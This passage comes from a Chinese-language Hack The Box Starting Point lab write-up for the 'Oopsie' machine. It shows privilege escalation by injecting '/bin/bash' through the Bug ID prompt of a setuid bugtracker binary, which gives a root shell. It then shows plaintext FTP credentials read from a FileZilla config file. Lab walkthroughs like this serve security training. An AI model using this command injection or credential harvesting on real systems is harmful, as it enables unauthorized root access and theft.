<h3 id=方法二推荐>方法二（推荐）<a hidden class=anchor aria-hidden=true href=#方法二推荐>#</a></h3>
<p>只需在运行<code>bugtracker</code>时输入如下命令：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>robert@oopsie:/tmp$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 111;<span style=color:#e6db74>&#39;/bin/bash&#39;</span>
111;<span style=color:#e6db74>&#39;/bin/bash&#39;</span>
---------------

cat: /root/reports/111: No such file or directory
</code></pre></div><p>此时便会以<code>root</code>身份执行一个<code>shell</code>：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@oopsie:/tmp# id
id
uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>robert<span style=color:#f92672>)</span>,1001<span style=color:#f92672>(</span>bugtracker<span style=color:#f92672>)</span>
</code></pre></div><p>查看<code>/root</code>目录下所有文件：</p>
<pre tabindex=0><code>root@oopsie:/tmp# ls -a /root
ls -a /root
.   .bash_history  .cache   .gnupg  .profile  root.txt  .viminfo
..  .bashrc        .config  .local  reports   .ssh
</code></pre><p>下一关信息：</p>
<p>切换到<code>/root/.config/filezilla</code>，查看<code>filezilla.xml</code>：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@oopsie:/root/.config/filezilla# cat filezilla.xml
</code></pre></div><p>内容：</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34; ?&gt;</span>
<span style=color:#f92672>&lt;FileZilla3&gt;</span>
    <span style=color:#f92672>&lt;RecentServers&gt;</span>
        <span style=color:#f92672>&lt;Server&gt;</span>
            <span style=color:#f92672>&lt;Host&gt;</span>10.10.10.46<span style=color:#f92672>&lt;/Host&gt;</span>
            <span style=color:#f92672>&lt;Port&gt;</span>21<span style=color:#f92672>&lt;/Port&gt;</span>
            <span style=color:#f92672>&lt;Protocol&gt;</span>0<span style=color:#f92672>&lt;/Protocol&gt;</span>
            <span style=color:#f92672>&lt;Type&gt;</span>0<span style=color:#f92672>&lt;/Type&gt;</span>
            <span style=color:#f92672>&lt;User&gt;</span>ftpuser<span style=color:#f92672>&lt;/User&gt;</span>
            <span style=color:#f92672>&lt;Pass&gt;</span>mc@F1l3ZilL4<span style=color:#f92672>&lt;/Pass&gt;</span>
            <span style=color:#f92672>&lt;Logontype&gt;</span>1<span style=color:#f92672>&lt;/Logontype&gt;</span>
            <span style=color:#f92672>&lt;TimezoneOffset&gt;</span>0<span style=color:#f92672>&lt;/TimezoneOffset&gt;</span>
            <span style=color:#f92672>&lt;PasvMode&gt;</span>MODE_DEFAULT<span style=color:#f92672>&lt;/PasvMode&gt;</span>
            <span style=color:#f92672>&lt;MaximumMultipleConnections&gt;</span>0<span style=color:#f92672>&lt;/MaximumMultipleConnections&gt;</span>
            <span style=color:#f92672>&lt;EncodingType&gt;</span>Auto<span style=color:#f92672>&lt;/EncodingType&gt;</span>
            <span style=color:#f92672>&lt;BypassProxy&gt;</span>0<span style=color:#f92672>&lt;/BypassProxy&gt;</span>
        <span style=color:#f92672>&lt;/Server&gt;</span>
    <span style=color:#f92672>&lt;/RecentServers&gt;</span>
<span style=color:#f92672>&lt;/FileZilla3&gt;</span>
</code></pre></div><blockquote>
<p>本文链接：<a href=https://oopsdc.tk/post/htb-starting-point/>HTB-Starting Point | Atmet (oopsdc.tk)</a></p>
<p>文章许可：本文采用<a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>CC BY-NC-SA 4.0</a>许可协议，转载请注明出处。</p>
</blockquote>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://oopsdc.tk/tags/hack-the-box/>Hack The Box</a></li>
</ul>
<nav class=paginav>
<a class=next href=https://oopsdc.tk/post/lxrunoffline/>
<span class=title>Next Page »</span>
<br>
<span>LxRunOffline使用手册</span>
</a>
</nav>
</footer>
</article>
</main><footer class=footer>
<span>&copy; 2021 <a href=https://oopsdc.tk/>Atmet</a></span>
<span>&#183;</span>
<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span>
<span>&#183;</span>
<span>Theme <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span>
<script src=https://utteranc.es/client.js repo=oopsdc/utterances issue-term=title theme=github-light crossorigin=anonymous async></script>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)">
<button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</button>
</a>
<script defer src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
</body>
</html>